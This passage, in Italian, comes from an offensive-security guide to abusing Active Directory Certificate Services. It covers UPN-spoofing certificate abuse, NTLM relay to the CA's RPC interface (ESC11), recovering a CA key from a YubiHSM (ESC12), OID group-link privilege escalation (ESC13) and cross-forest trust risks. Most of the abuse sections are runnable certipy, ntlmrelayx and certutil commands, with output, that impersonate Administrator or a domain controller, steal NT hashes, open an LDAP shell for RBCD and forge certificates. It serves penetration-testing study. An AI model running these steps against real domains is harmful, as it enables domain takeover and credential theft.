Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo deliberatamente la parte `@corp.local` per evitare una violazione dei vincoli.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Successivamente, viene richiesta un certificato che abilita l'autenticazione del client come `Jane`, utilizzando il modello predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo originale, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticarsi con il certificato ottenuto restituirà l'hash NT di `Administrator@corp.local`, rendendo necessaria la specifica del dominio nel comando a causa dell'assenza di dettagli sul dominio nel certificato.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Con il `CertificateMappingMethods` che contiene il bit flag `UPN` (`0x4`), un account A con permessi `GenericWrite` può compromettere qualsiasi account B privo della proprietà `userPrincipalName`, inclusi gli account macchina e l'amministratore di dominio integrato `Administrator`.

Qui, l'obiettivo è compromettere `DC$@corp.local`, iniziando con l'ottenere l'hash di `Jane` tramite Shadow Credentials, sfruttando il `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Il `userPrincipalName` di `Jane` è quindi impostato su `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Un certificato per l'autenticazione del client viene richiesto come `Jane` utilizzando il modello predefinito `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Il `userPrincipalName` di `Jane` viene ripristinato al suo stato originale dopo questo processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Per autenticarsi tramite Schannel, viene utilizzata l'opzione `-ldap-shell` di Certipy, che indica il successo dell'autenticazione come `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Attraverso la shell LDAP, comandi come `set_rbcd` abilitano attacchi di Delegazione Constrainata Basata sulle Risorse (RBCD), compromettendo potenzialmente il controller di dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Questa vulnerabilità si estende anche a qualsiasi account utente privo di un `userPrincipalName` o in cui non corrisponde al `sAMAccountName`, con il predefinito `Administrator@corp.local` che è un obiettivo principale a causa dei suoi privilegi LDAP elevati e dell'assenza di un `userPrincipalName` per impostazione predefinita.

## Relaying NTLM to ICPR - ESC11

### Spiegazione

Se il server CA non è configurato con `IF_ENFORCEENCRYPTICERTREQUEST`, può essere soggetto ad attacchi di relay NTLM senza firma tramite il servizio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puoi usare `certipy` per enumerare se `Enforce Encryption for Requests` è disabilitato e certipy mostrerà le vulnerabilità `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

È necessario configurare un server di relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Per i controller di dominio, dobbiamo specificare `-template` in DomainController.

Oppure usando [il fork di impacket di sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Accesso shell a ADCS CA con YubiHSM - ESC12

### Spiegazione

Gli amministratori possono configurare l'Autorità di Certificazione per memorizzarla su un dispositivo esterno come il "Yubico YubiHSM2".

Se un dispositivo USB è connesso al server CA tramite una porta USB, o un server di dispositivi USB nel caso in cui il server CA sia una macchina virtuale, è necessaria una chiave di autenticazione (a volte chiamata "password") affinché il Key Storage Provider generi e utilizzi chiavi nel YubiHSM.

Questa chiave/password è memorizzata nel registro sotto `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in chiaro.

Riferimento in [qui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenario di abuso

Se la chiave privata della CA è memorizzata su un dispositivo USB fisico quando hai ottenuto l'accesso shell, è possibile recuperare la chiave.

In primo luogo, è necessario ottenere il certificato CA (questo è pubblico) e poi:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Infine, usa il comando certutil `-sign` per forgiare un nuovo certificato arbitrario utilizzando il certificato CA e la sua chiave privata.

## Abuso del Link del Gruppo OID - ESC13

### Spiegazione

L'attributo `msPKI-Certificate-Policy` consente di aggiungere la politica di emissione al modello di certificato. Gli oggetti `msPKI-Enterprise-Oid` responsabili dell'emissione delle politiche possono essere scoperti nel Contesto di Nominazione della Configurazione (CN=OID,CN=Public Key Services,CN=Services) del contenitore OID PKI. Una politica può essere collegata a un gruppo AD utilizzando l'attributo `msDS-OIDToGroupLink` di questo oggetto, consentendo a un sistema di autorizzare un utente che presenta il certificato come se fosse un membro del gruppo. [Riferimento qui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In altre parole, quando un utente ha il permesso di registrare un certificato e il certificato è collegato a un gruppo OID, l'utente può ereditare i privilegi di questo gruppo.

Usa [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) per trovare OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Trova un permesso utente che può utilizzare `certipy find` o `Certify.exe find /showAllPermissions`.

Se `John` ha il permesso di iscriversi a `VulnerableTemplate`, l'utente può ereditare i privilegi del gruppo `VulnerableGroup`.

Tutto ciò che deve fare è specificare il template, otterrà un certificato con diritti OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Compromissione delle Foreste con Certificati Spiegata in Voce Passiva

### Violazione dei Trust delle Foreste da CAs Compromessi

La configurazione per il **cross-forest enrollment** è relativamente semplice. Il **certificato CA radice** della foresta di risorse è **pubblicato nelle foreste account** dagli amministratori, e i certificati **CA aziendali** della foresta di risorse sono **aggiunti ai contenitori `NTAuthCertificates` e AIA in ciascuna foresta account**. Per chiarire, questo accordo concede alla **CA nella foresta di risorse il controllo completo** su tutte le altre foreste per le quali gestisce la PKI. Se questa CA fosse **compromessa da attaccanti**, i certificati per tutti gli utenti sia nella foresta di risorse che in quella account potrebbero essere **falsificati da loro**, compromettendo così il confine di sicurezza della foresta.

### Privilegi di Iscrizione Concessi a Principali Stranieri

Negli ambienti multi-foresta, è necessaria cautela riguardo alle CA aziendali che **pubblicano modelli di certificato** che consentono a **Utenti Autenticati o principali stranieri** (utenti/gruppi esterni alla foresta a cui appartiene la CA aziendale) **diritti di iscrizione e modifica**.\
Dopo l'autenticazione attraverso un trust, il **SID Utenti Autenticati** viene aggiunto al token dell'utente da AD. Pertanto, se un dominio possiede una CA aziendale con un modello che **consente diritti di iscrizione agli Utenti Autenticati**, un modello potrebbe potenzialmente essere **iscritto da un utente di una foresta diversa**. Allo stesso modo, se **i diritti di iscrizione sono esplicitamente concessi a un principale straniero da un modello**, si crea così una **relazione di controllo accessi cross-forest**, consentendo a un principale di una foresta di **iscriversi a un modello di un'altra foresta**.

Entrambi gli scenari portano a un **aumento della superficie di attacco** da una foresta all'altra. Le impostazioni del modello di certificato potrebbero essere sfruttate da un attaccante per ottenere privilegi aggiuntivi in un dominio straniero.
